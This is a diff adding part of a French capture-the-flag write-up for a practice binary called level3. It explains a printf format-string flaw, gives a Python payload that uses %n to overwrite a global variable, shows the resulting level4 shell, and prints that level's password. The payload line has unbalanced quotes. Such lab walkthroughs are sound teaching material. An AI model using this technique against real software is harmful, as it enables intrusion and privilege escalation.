@@ -48,3 +48,19 @@ Continuing
 Wait what?!
 $
 La fonction suit donc son cours normal et l’appel a la fonction systeme va executer /bin/bash pour ouvrir un terminal. Cependant nous n’avons pas les droit du level4 et donc il nous est impossible d’afficher le flag. Mais alors ou est donc la vulnerabilite ?
+
+Avec la presence d'un call de la fonction printf nous pouvons nous dire que la vulnerabilite serait une vuln de type Format String. En effet en utilisant le formateur %n nous pouvons ecrire a une adresse en memoire. En regardant de plus pres la fonction v nous que nous mettons dans le registre eax la valeur de ce qu'il y a a l'adresse memoire 0x804988c
+
+x/x 0x804988c
+0x804988c <m>: 0x00000000
+Il s'agit donc d'une varible m qui est nulle. Essayons donc d'ecrire 64 caractere dans la variqble m. 
+
+python -c 'print("\x8c\x98\x04\x08: + "A" * 64 + "%4$n")' > /tmp/level3
+cat /tmp/level3 - | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+cd ../level4
+cat .pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
